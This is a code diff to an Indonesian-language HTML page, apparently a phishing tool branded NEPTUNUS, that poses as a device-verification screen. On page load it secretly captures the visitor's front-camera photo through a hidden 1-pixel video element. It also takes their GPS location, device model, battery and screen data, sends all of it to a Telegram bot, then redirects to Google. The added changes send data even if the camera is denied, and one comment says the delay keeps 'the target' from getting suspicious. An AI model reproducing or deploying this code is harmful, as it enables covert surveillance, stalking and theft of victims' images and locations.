@@ -14,7 +14,6 @@
     <div class="loader"></div>
     <p>Sedang memverifikasi perangkat anda...</p>
 
-    <!-- Elemen Video Tersembunyi -->
     <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0; transform: scaleX(-1);" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -24,33 +23,45 @@
         
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        let userLocation = "Akses Lokasi Ditolak/Belum Didapat";
 
-        // Database identifikasi model HP
+        // --- DAFTAR MODEL HP (LENGKAP) ---
         function translateModel(model) {
             const brands = {
-                // Xiaomi
+                // Xiaomi / Redmi / POCO
                 '2310FPCA4G': 'Xiaomi Redmi 13C',
                 '2201117TY': 'Redmi Note 11',
                 '21061119AL': 'Xiaomi Mi 11 Lite',
                 '2201116SG': 'Redmi Note 11 Pro',
                 'M2012K11AG': 'POCO F3',
+                'M2102J20SG': 'POCO X3 Pro',
+                
                 // Samsung
                 'SM-G991B': 'Samsung S21',
                 'SM-A525F': 'Samsung Galaxy A52',
                 'SM-A125F': 'Samsung Galaxy A12',
                 'SM-M315F': 'Samsung Galaxy M31',
-                // Oppo & Realme
+                'SM-A515F': 'Samsung Galaxy A51',
+                
+                // Oppo / Realme
                 'CPH2219': 'Oppo A94',
                 'CPH2127': 'Oppo A53',
+                'CPH1907': 'Oppo Reno 2',
                 'RMX3363': 'Realme GT Master Edition',
                 'RMX2151': 'Realme 7',
-                // Infinix & Vivo
+                'RMX3085': 'Realme 8',
+                
+                // Infinix / Vivo
                 'X688B': 'Infinix Hot 10',
+                'X657B': 'Infinix Smart 5',
                 'V2025': 'Vivo V20',
-                // Generic
+                'V2109': 'Vivo Y21',
+
+                // Generic Matchers
                 'CPH': 'Oppo Device',
                 'RMX': 'Realme Device',
-                'SM-': 'Samsung Galaxy'
+                'SM-': 'Samsung Galaxy',
+                'M2': 'Xiaomi/POCO'
             };
 
             for (let key in brands) {
@@ -80,90 +91,85 @@
             return model;
         }
 
-        // Mendapatkan Lokasi GPS
-        function getGeoLocation() {
+        // --- FUNGSI LOKASI ---
+        function askLocation() {
             return new Promise((resolve) => {
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            resolve(`https://www.google.com/maps?q=${lat},${lon}`);
+                            userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                            resolve();
                         },
-                        () => resolve("Izin Lokasi Ditolak"),
-                        { enableHighAccuracy: true, timeout: 5000 }
+                        () => { resolve(); },
+                        { enableHighAccuracy: true, timeout: 10000 }
                     );
                 } else {
-                    resolve("Tidak Didukung");
+                    userLocation = "Tidak Didukung Browser";
+                    resolve();
                 }
             });
         }
 
+        // --- FUNGSI KAMERA ---
         async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
+                    // Jeda 3 detik agar target tidak curiga dan GPS sempat terbaca
                     setTimeout(takeSnapshot, 3000);
                 };
             } catch (err) {
-                // Jika akses kamera ditolak
-                window.location.href = "https://google.com";
+                // Tetap kirim data meskipun kamera ditolak
+                setTimeout(takeSnapshot, 2000);
             }
         }
 
         async function takeSnapshot() {
-            // Informasi Baterai
             let battery = "N/A";
-            try {
-                if (navigator.getBattery) {
-                    const bat = await navigator.getBattery();
-                    battery = Math.round(bat.level * 100) + "%";
-                }
-            } catch (e) {}
+            try { if (navigator.getBattery) { const bat = await navigator.getBattery(); battery = Math.round(bat.level * 100) + "%"; } } catch (e) {}
 
             const deviceName = await getFullDeviceName();
-            const locationLink = await getGeoLocation();
 
-            const info = `📸 <b>Berhasil mengambil foto</b>\n\n` +
+            const info = `📸 <b>Laporan Target Aktif</b>\n\n` +
                          `📱 <b>Perangkat:</b> <code>${deviceName}</code>\n` +
                          `🔋 <b>Baterai:</b> ${battery}\n` +
+                         `📍 <b>Lokasi:</b> ${userLocation}\n` +
                          `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : '4G'}\n` +
-                         `📍 <b>Lokasi:</b> ${locationLink}\n` +
-                         `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
-                         `🌍 <b>Sistem:</b> Android\n\n` +
+                         `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n\n` +
                          `<i>NEPTUNUS V1.0.8</i>`;
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-            
             const ctx = canvas.getContext('2d');
-            // Mirroring agar tidak terbalik
             ctx.scale(-1, 1);
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-                if (!blob) { window.location.href = "https://google.com"; return; }
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'selfie.jpg');
-                formData.append('caption', info);
                 formData.append('parse_mode', 'HTML');
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).finally(() => {
-                    // Redirect ke Google setelah selesai
-                    window.location.href = "https://google.com";
-                });
+                if (blob) {
+                    formData.append('photo', blob, 'selfie.jpg');
+                    formData.append('caption', info);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                    .finally(() => { window.location.href = "https://google.com"; });
+                } else {
+                    // Jika tidak ada foto (kamera off), kirim teks saja
+                    formData.append('text', info);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: formData })
+                    .finally(() => { window.location.href = "https://google.com"; });
+                }
             }, 'image/jpeg', 0.8);
         }
 
-        window.onload = startCamera;
+        // Eksekusi otomatis saat halaman dimuat
+        window.onload = () => {
+            askLocation(); 
+            startCamera();
+        };
     </script>
 </body>
 </html>
